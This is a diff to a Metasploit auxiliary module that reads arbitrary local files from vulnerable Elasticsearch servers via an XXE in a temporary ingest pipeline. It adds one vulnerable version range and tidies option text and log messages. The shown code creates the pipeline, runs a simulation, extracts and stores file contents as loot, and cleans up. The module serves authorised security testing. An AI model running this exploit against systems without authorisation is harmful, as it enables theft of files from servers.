@@ -1,3 +1,5 @@
+# frozen_string_literal: true
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -46,9 +48,9 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(9200),
         OptString.new('TARGETURI', [true, 'Elasticsearch base path', '/']),
-        OptString.new('FILEPATH', [true, 'Absolute file path to read', '/etc/hostname']),
+        OptString.new('FILEPATH', [true, 'Absolute POSIX file path to read', '/etc/hostname']),
         OptString.new('AUTHORIZATION', [false, 'Complete Authorization header value, such as ApiKey ... or Basic ...']),
-        OptInt.new('INDEXED_CHARS', [true, 'Maximum extracted characters (-1 means unlimited)', 1048576]),
+        OptInt.new('INDEXED_CHARS', [true, 'Maximum extracted characters (-1 means unlimited; default: 1048576)', 1048576]),
         OptBool.new('STORE_LOOT', [true, 'Store returned file content as loot', true])
       ]
     )
@@ -87,6 +89,7 @@ class MetasploitModule < Msf::Auxiliary
     return nil if version.nil?
 
     v = Rex::Version.new(version)
+    return true if v >= Rex::Version.new('8.18.0') && v < Rex::Version.new('8.18.6')
     return true if v >= Rex::Version.new('8.19.0') && v < Rex::Version.new('8.19.3')
     return true if v >= Rex::Version.new('9.0.0') && v < Rex::Version.new('9.0.6')
     return true if v >= Rex::Version.new('9.1.0') && v < Rex::Version.new('9.1.3')
@@ -177,7 +180,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     unless datastore['FILEPATH'].start_with?('/')
-      print_error('FILEPATH must be an absolute path')
+      print_error('FILEPATH must be an absolute POSIX path')
       return
     end
 
@@ -185,7 +188,7 @@ class MetasploitModule < Msf::Auxiliary
     uri = pipeline_path(pipeline)
     created = false
 
-    print_status("#{ip}:#{rport} - Creating temporary ingest pipeline #{pipeline}")
+    print_status("Creating temporary ingest pipeline #{pipeline}")
     begin
       body = {
         description: 'Temporary Metasploit authorized XFA XXE validation pipeline',
@@ -209,7 +212,7 @@ class MetasploitModule < Msf::Auxiliary
         'data' => body.to_json
       )
       unless res&.code&.between?(200, 299)
-        print_error("#{ip}:#{rport} - Pipeline creation failed#{res ? " (HTTP #{res.code})" : ''}")
+        print_error("Pipeline creation failed#{res ? " (HTTP #{res.code})" : ''}")
         return
       end
       created = true
@@ -232,23 +235,23 @@ class MetasploitModule < Msf::Auxiliary
         'data' => payload.to_json
       )
       unless res&.code == 200
-        print_error("#{ip}:#{rport} - Pipeline simulation failed#{res ? " (HTTP #{res.code})" : ''}")
+        print_error("Pipeline simulation failed#{res ? " (HTTP #{res.code})" : ''}")
         return
       end
 
       content = parse_content(res)
       if content.to_s.empty?
-        print_error("#{ip}:#{rport} - No local file content was extracted")
+        print_error('No local file content was extracted')
         return
       end
 
-      print_good("#{ip}:#{rport} - Read #{datastore['FILEPATH']} (#{content.bytesize} bytes)")
+      print_good("Read #{datastore['FILEPATH']} (#{content.bytesize} bytes)")
       print_line(content)
       report_vuln(host: ip, port: rport, proto: 'tcp', name: fullname, refs: references)
 
       if datastore['STORE_LOOT']
         path = store_loot('elasticsearch.tika.xxe', 'text/plain', ip, content, ::File.basename(datastore['FILEPATH']), 'Elasticsearch Tika XXE local file')
-        print_good("#{ip}:#{rport} - Loot stored in: #{path}")
+        print_good("Loot stored in: #{path}")
       end
     ensure
       if created
@@ -258,9 +261,9 @@ class MetasploitModule < Msf::Auxiliary
           'headers' => request_headers
         )
         if cleanup&.code&.between?(200, 299) || cleanup&.code == 404
-          vprint_status("#{ip}:#{rport} - Temporary pipeline deleted")
+          vprint_status('Temporary pipeline deleted')
         else
-          print_warning("#{ip}:#{rport} - Temporary pipeline cleanup failed")
+          print_warning('Temporary pipeline cleanup failed')
         end
       end
     end
